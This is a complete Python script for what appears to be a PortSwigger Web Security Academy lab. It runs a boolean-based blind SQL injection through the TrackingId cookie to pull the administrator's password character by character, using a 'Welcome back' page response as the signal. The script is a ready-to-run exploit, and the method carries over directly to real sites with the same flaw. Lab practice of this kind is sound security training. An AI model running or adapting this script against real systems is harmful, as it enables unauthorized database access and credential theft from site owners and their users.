import requests
import string
from urllib.parse import quote


URL      = "https://LAB-ID.web-security-academy.net/"
TRACKING = "FRESH-TRACKINGID"      # verified TrackingId
SESSION  = "FRESH-SESSION"          # session cookie value
# -----------------------------------------------------

charset = string.ascii_lowercase + string.digits   # a-z0-9
password = ""
position = 1

while True:
    found = False
    for ch in charset:
        inj = f"{TRACKING}' AND (SELECT SUBSTRING(password,{position},1) FROM users WHERE username='administrator')='{ch}"
        cookie = f"TrackingId={quote(inj)}; session={SESSION}"
        r = requests.get(URL, headers={"Cookie": cookie})
        if "Welcome back" in r.text:        
            password += ch
            print(f"[{position:>2}] {ch}  ->  {password}")
            found = True
            break                            
    if not found:
        break                                
    position += 1

print("\Password:", password)